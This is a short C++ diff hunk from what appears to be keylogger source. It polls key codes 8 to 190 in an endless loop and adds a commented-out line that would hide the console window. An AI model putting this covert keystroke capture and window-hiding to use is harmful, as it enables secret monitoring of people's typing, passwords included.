@@ -5,6 +5,7 @@
 using namespace std::literals::chrono_literals;
 
 int main() {
+    //ShowWindow(GetConsoleWindow(), SW_HIDE);
     while (true) {
         std::this_thread::sleep_for(10ms);
         for (int KEY = 8; KEY <= 190; KEY++) {
